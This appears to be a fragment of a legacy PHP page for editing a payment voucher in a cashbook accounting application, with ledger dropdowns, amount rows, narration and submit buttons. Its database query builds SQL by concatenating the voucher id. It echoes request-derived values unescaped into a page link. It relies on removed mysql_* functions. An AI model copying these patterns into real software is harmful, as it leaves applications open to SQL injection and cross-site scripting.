									<td width="230px"><input name="VoucherNo" id="VoucherNo" readonly="true" class="styleInput" value="<?php echo $VoucherNumber; ?>" style="background-color:#FFE1FF;"></td>
									<td width="150px">&nbsp;<input type="hidden" name="startYear" id="startYear" value="<?php echo date("d-m-Y",strtotime($_SESSION['cashbook_syr']));?>"/><input type="hidden" name="endYear" id="endYear" value="<?php echo date("d-m-Y",strtotime($_SESSION['cashbook_eyr']));?>"/><input type="hidden" name="minDate" id="minDate" value="<?php echo $minimum_date; ?>"/><input type="hidden" name="maxDate" id="maxDate" value="<?php echo date("d-m-Y"); ?>"/></td>
									<td width="50px"><b style="font-size:14px;color:#FFFFFF;">Date&nbsp;:&nbsp;</b></td>
									<td width="120px"><input name="Paydate" id="Paydate" maxlength="10" readonly="true" class="styleInput1" value="<?php echo date("d-m-Y", strtotime($res1['vouch_date'])); ?>" onchange="get_cash_balance(document.getElementById('cihName').value)" style="background-color:#FFE1FF;"/></td>
								</tr>
								<tr height="10px" width="770px">
									<td width="12px">&nbsp;<?php echo '<select name="expHead" id="expHead" style="width:230px; height:20px; display:none;">
									<option value="0">--Select--</option>';
									$sqlLedger=mysql_db_query(DATABASE2,"SELECT * FROM ledger ORDER BY ledger_name") or die(mysql_error());
									while($resLedger=mysql_fetch_array($sqlLedger)){
										echo '<option value="'.$resLedger['ledger_id'].'">'.$resLedger['ledger_name'].'</option>';
									}
									echo '</select>';?></td>
									<td width="90px"><b style="font-size:14px;color:#FFFFFF;">Cr. A/C&nbsp;:&nbsp;</b></td>
									<?php if($_SESSION['cashbook_utype']=="A" || $_SESSION['cashbook_utype']=="S"){
										echo '<td width="230px"><input name="cih" id="cih" size="34" readonly="true" value="'.$res1['cih_name'].'" style="background-color:#FFE1FF;"/><input type="hidden" name="cihName" id="cihName" value="'.$res1['cih_id'].'"/></td>';
									} elseif($_SESSION['cashbook_utype']=="U"){
										echo '<td width="230px"><input name="cih" id="cih" size="34" readonly="true" value="'.$_SESSION['cashbook_cihname'].'" style="background-color:#FFE1FF;"><input type="hidden" name="cihName" id="cihName" value="'.$_SESSION['cashbook_cihid'].'"/></td>';
									} ?>
									<td width="150px">&nbsp;<input type="hidden" name="currentBalance" id="currentBalance" value="<?php echo $current_balance; ?>"></td>
									<td width="50px"><b style="font-size:14px;color:#FFFFFF;">Balance&nbsp;:&nbsp;</b></td>
									<td width="120px" id="tdBal"><?php if($current_balance>=0){
									echo '<input name="Balance" id="Balance" readonly="true" value="'.$balance.'" class="styleInput1" style="background-color:#FFE1FF; color:#FF0000;">';
									} else {
									echo '<input name="Balance" id="Balance" readonly="true" value="'.$balance.'" class="styleInput1" style="background-color:#FFE1FF; color:#000000;">';
									} ?>
									</td>
								</tr>
								<?php 
								$i = 0;
								$remark = "";
								$total_amount = 0;
								$sql1=mysql_db_query(DATABASE2,"SELECT tblcash1.*,tblcash2.* FROM tblcash1 INNER JOIN tblcash2 ON tblcash1.vouch_id = tblcash2.vouch_id WHERE tblcash1.vouch_id=".$vid." ORDER BY seq_no") or die(mysql_error());
								$count = mysql_num_rows($sql1);
								while($res1=mysql_fetch_array($sql1)){
									$remark = $res1['remark'];
									echo '<tr id="trRow['.$i.']" height="10px" width="770px">
									<td width="12px" id="tdColA['.$i.']"><a onclick="hide_row('.$i.')"><img src="images/shrink.gif" style="display:inline; cursor:hand;" border="0" /></a></td>
									<td width="90px" id="tdColB['.$i.']"><b style="font-size:14px;color:#FFFFFF;">Dr. A/C&nbsp;:&nbsp;</b></td>
									<td width="230px" id="tdColC['.$i.']">';
									echo '<select name="exp_head_'.$i.'" id="exp_head_'.$i.'" style="width:230px; height:20px;">
									<option value="0">--Select--</option>';
									$sqlLedger=mysql_db_query(DATABASE2,"SELECT * FROM ledger ORDER BY ledger_name") or die(mysql_error());
									while($resLedger=mysql_fetch_array($sqlLedger)){
										if($resLedger['ledger_id']==$res1['exps_id'])
											echo '<option selected value="'.$resLedger['ledger_id'].'">'.$resLedger['ledger_name'].'</option>';
										else
											echo '<option value="'.$resLedger['ledger_id'].'">'.$resLedger['ledger_name'].'</option>';
									}
									echo '</select></td>
									<td width="150px" id="tdColD['.$i.']">&nbsp;<input type="hidden" name="hideT'.$i.'" id="hideT'.$i.'" value="P"/></td>
									<td width="50px" id="tdColE['.$i.']"><b style="font-size:14px;color:#FFFFFF;">Amount&nbsp;:&nbsp;</b></td>
									<td width="120px" id="tdColF['.$i.']"><input name="Amt'.$i.'" id="Amt'.$i.'" value="'.number_format(-1*$res1['exps_amt'],2,".","").'" class="styleInput1" onkeyup="return check_value(this.value);"></td>
									</tr>';
									$total_amount += (-1*$res1['exps_amt']);
									$i++;
								}
								
								//now fill up rest of the rows (i.e. upto 99) as default and hide them
								for($i=$count; $i<=99; $i++){
									if($i==$count){
										echo '<tr id="trRow['.$i.']" height="10px" width="770px">';
										echo '<td width="12px" id="tdColA['.$i.']" width="8px"><a onclick="show_row('.$i.')"><img src="images/expand.gif" style="display:inline; cursor:hand;" border="0" /></a></td>';
									} else {
										echo '<tr id="trRow['.$i.']" height="10px" width="770px" style="display:none;">';
										echo '<td width="12px" id="tdColA['.$i.']" style="display:none;"><a onclick="show_row('.$i.')"><img src="images/expand.gif" style="display:inline; cursor:hand;" border="0" /></a></td>';
									}
								
								echo '<td width="90px" id="tdColB['.$i.']" style="display:none;"><b style="font-size:14px;color:#FFFFFF;">Dr. A/C&nbsp;:&nbsp;</b></td>
								<td width="230px" id="tdColC['.$i.']" style="display:none;"><select name="exp_head_'.$i.'" id="exp_head_'.$i.'" style="width:230px; height:20px;"><option value="0">--Select--</option></select></td>
								<td width="150px" id="tdColD['.$i.']" style="display:none;">&nbsp;<input type="hidden" name="hideT'.$i.'" id="hideT'.$i.'" value="D"/></td>
								<td width="50px" id="tdColE['.$i.']" style="display:none;"><b style="font-size:14px;color:#FFFFFF;">Amount&nbsp;:&nbsp;</b></td>
								<td width="120px" id="tdColF['.$i.']" style="display:none;"><input name="Amt'.$i.'" id="Amt'.$i.'" value="0" class="styleInput1" onkeyup="return check_value(this.value);"></td>
								</tr>';
								}?>
								<tr height="10px" width="770px">
									<td width="12px"></td>
									<td width="90px"><b style="font-size:14px;color:#FFFFFF;">Narration&nbsp;:&nbsp;</b></td>
									<td width="230px"><textarea name="remark" cols="26" rows="4"><?php echo $remark; ?></textarea></td>
									<td width="150px">&nbsp;</td>
									<td width="50px"><b style="font-size:14px;color:#FFFFFF;">Total&nbsp;:&nbsp;</b></td>
									<td width="120px"><input name="TotalAmt" id="TotalAmt" value="<?php echo number_format($total_amount,2,".",""); ?>" readonly="true" class="styleInput1" style="background-color:#FFE1FF;"></td>
								</tr>
								</table>
							</td>
						</tr>
						</table>
					</td>
				</tr>
				<tr>
					<?php $page = "lstcashbook.php?lid=".$lid."&dt1=".$dt1."&dt2=".$dt2;
					if(isset($_REQUEST['pg'])){$page .= "&pg=".$pg."&tr=".$tr;}?>
					<td align="right" height="35px"><b style="font-size:14px;color:#FFFFFF;">Available Balance&nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</b><span id="avlBalSpan"><?php if($current_balance>=0){echo '<input name="availBalance" id="availBalance" readonly="true" value="'.$balance.'" class="styleInput1" style="background-color:#FFE1FF; color:#FF0000;">';} else {echo '<input name="availBalance" id="availBalance" readonly="true" value="'.$balance.'" class="styleInput1" style="background-color:#FFE1FF; color:#000000;">';}?></span><?php echo str_repeat("&nbsp;",28); ?><input type="submit" name="submit" value="Submit" style="width:80px;">&nbsp;&nbsp;<input type="button" value="Refresh" style="width:80px;" onclick="reset()">&nbsp;&nbsp;<input type="submit" name="submit" value="ChangeToReceipt">&nbsp;&nbsp;<input type="button" value="Exit" style="width:80px;" onclick="window.location='<?php echo $page;?>'">
					</td>
				</tr>
				</table>
			</td>
		</tr>
		</table>
	</td>
</tr>
</table>
</form>
</body>
</html>